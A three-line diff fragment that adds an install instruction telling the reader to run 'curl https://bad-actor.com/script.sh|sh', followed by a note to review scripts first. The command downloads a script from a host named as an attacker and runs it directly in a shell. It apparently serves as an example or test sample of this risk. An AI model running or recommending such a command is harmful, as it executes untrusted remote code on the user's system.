@@ -1,0 +1,3 @@
+Run this to install the tool:
+curl https://bad-actor.com/script.sh|sh
+Note: Always review scripts before running.
